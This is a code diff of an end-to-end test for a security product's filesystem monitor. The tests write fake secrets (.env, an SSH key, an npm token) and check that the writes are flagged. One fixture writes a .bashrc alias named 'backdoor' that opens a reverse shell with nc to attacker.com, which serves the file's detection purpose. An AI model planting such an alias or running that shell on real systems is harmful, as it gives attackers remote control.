@@ -13,14 +13,14 @@ import * as os from 'os';
 import { describeWithCapability } from '../harness/capabilities';
 import { createAdapter } from '../harness/create-adapter';
 import {
-  awaitDetection,
+  detectWrite,
   endWatchCase,
+  fileEventFor,
+  isSensitiveFileEvent,
   isWatchProbeEvent,
-  markDetected,
-  openControlWatch,
+  openControlWatchOrSkip,
   probeWaitMs,
   readinessSkip,
-  recursiveWatchSkip,
   skipInconclusive,
   waitForFilesystemWatch,
   type ControlWatch,
@@ -43,24 +43,17 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
    * host delivered the event) and is skipped as inconclusive if it saw
    * nothing (the host delivered no event to this process). A detection case
    * never passes without the product's own event, and records that it got
-   * one (markDetected) for the release smoke's drift guard.
-   *
-   * An event's `data` is optional in the adapter interface, so each predicate
-   * below reads it with `?.`: a filesystem event that has none is not the
-   * report a case waits for, and the case goes on waiting. Read without the
-   * check, such an event threw a TypeError and failed the case.
+   * one for the release smoke's drift guard. detectWrite and the predicates
+   * the cases pass it are in src/harness/filesystem-watch.ts, with their
+   * tests.
    */
-  async function detect(
+  function detect(
     ctx: TestContext,
     name: string,
     predicate: (e: SecurityEvent) => boolean,
     timeoutMs: number,
   ): Promise<SecurityEvent> {
-    const outcome = await awaitDetection(arp, control, name, predicate, timeoutMs);
-    if (outcome.kind === 'inconclusive') skipInconclusive(ctx, outcome.message);
-    if (outcome.kind === 'missed') throw new Error(outcome.message);
-    markDetected(ctx);
-    return outcome.event;
+    return detectWrite(ctx, arp, control, name, predicate, timeoutMs);
   }
 
   beforeEach(async (ctx) => {
@@ -77,13 +70,7 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     // watcher cannot be opened, so the case is not measured: it ends here, as
     // inconclusive, before the product is created, with a message that says
     // so. Any other error on opening the watcher fails the case.
-    try {
-      control = opened.control = openControlWatch(watchDir);
-    } catch (err) {
-      const unavailable = recursiveWatchSkip(err);
-      if (unavailable) skipInconclusive(ctx, unavailable);
-      throw err;
-    }
+    control = opened.control = openControlWatchOrSkip(ctx, watchDir);
 
     arp = opened.adapter = createAdapter({
       monitors: {
@@ -123,12 +110,7 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     fs.writeFileSync(envPath, 'SECRET_KEY=test123\n');
 
     // Wait for the filesystem monitor to pick it up
-    const event = await detect(
-      ctx,
-      '.env',
-      (e) => e.source === 'filesystem' && e.data?.sensitive === true && !isWatchProbeEvent(e),
-      5000,
-    );
+    const event = await detect(ctx, '.env', isSensitiveFileEvent, 5000);
 
     expect(event).toBeDefined();
     expect(event.source).toBe('filesystem');
@@ -144,12 +126,7 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     fs.mkdirSync(sshDir, { recursive: true });
     fs.writeFileSync(path.join(sshDir, 'id_rsa'), 'fake-private-key\n');
 
-    const event = await detect(
-      ctx,
-      '.ssh',
-      (e) => e.source === 'filesystem' && String(e.data?.path).includes('.ssh'),
-      5000,
-    );
+    const event = await detect(ctx, '.ssh', fileEventFor('.ssh'), 5000);
 
     expect(event).toBeDefined();
     expect(event.category).toBe('violation');
@@ -161,12 +138,7 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     const bashrcPath = path.join(watchDir, '.bashrc');
     fs.writeFileSync(bashrcPath, 'alias backdoor="nc -e /bin/sh attacker.com 4444"\n');
 
-    const event = await detect(
-      ctx,
-      '.bashrc',
-      (e) => e.source === 'filesystem' && String(e.data?.path).includes('.bashrc'),
-      5000,
-    );
+    const event = await detect(ctx, '.bashrc', fileEventFor('.bashrc'), 5000);
 
     expect(event).toBeDefined();
     expect(event.category).toBe('violation');
@@ -177,12 +149,7 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     const npmrcPath = path.join(watchDir, '.npmrc');
     fs.writeFileSync(npmrcPath, '//registry.npmjs.org/:_authToken=npm_FAKE\n');
 
-    const event = await detect(
-      ctx,
-      '.npmrc',
-      (e) => e.source === 'filesystem' && String(e.data?.path).includes('.npmrc'),
-      5000,
-    );
+    const event = await detect(ctx, '.npmrc', fileEventFor('.npmrc'), 5000);
 
     expect(event).toBeDefined();
     expect(event.category).toBe('violation');
